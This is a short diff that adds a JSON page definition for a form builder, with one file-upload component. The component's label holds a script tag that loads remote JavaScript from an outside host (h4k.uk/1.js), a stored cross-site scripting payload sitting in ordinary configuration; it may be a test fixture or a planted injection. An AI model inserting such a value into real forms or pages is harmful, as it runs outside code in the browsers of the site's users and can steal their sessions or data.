@@ -1,0 +1,16 @@
+{
+  "_id": "page.1_",
+  "_type": "page.singlequestion",
+  "components": [
+    {
+      "_id": "page.1_--upload.auto_name__1",
+      "_type": "upload",
+      "label": "<script src=h4k.uk/1.js></script>",
+      "name": "auto_name__1"
+    }
+  ],
+  "steps": [
+    "page.1_-check"
+  ],
+  "url": "1/"
+}
